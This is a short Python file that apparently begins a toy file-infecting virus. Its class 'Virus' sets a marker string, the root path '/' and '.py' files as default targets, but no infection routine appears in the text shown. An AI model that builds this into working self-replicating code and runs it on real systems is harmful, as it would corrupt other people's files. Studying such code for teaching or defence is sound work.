import os
import datetime 
import pathlib
import time

class Virus:
    def __init__(self,infect_string=None,path=None ,\
                 extension=None,target_file_list=None):
        if isinstance(infect_string,type(None)):
            self.infect_string= "I am a Virus"
        else:
            self.infect_string=infect_string
        
        if isinstance(path,type(None)):
            self.path="/"
        else:
            self.path=path
        
        if isinstance(extension, type(None)):
            self.extension=".py"
        else:
            self.extension=extension
        
        if isinstance(target_file_list, type(None)):
            self.target_file_list=[]
        else:
            self.target_file_list=target_file_list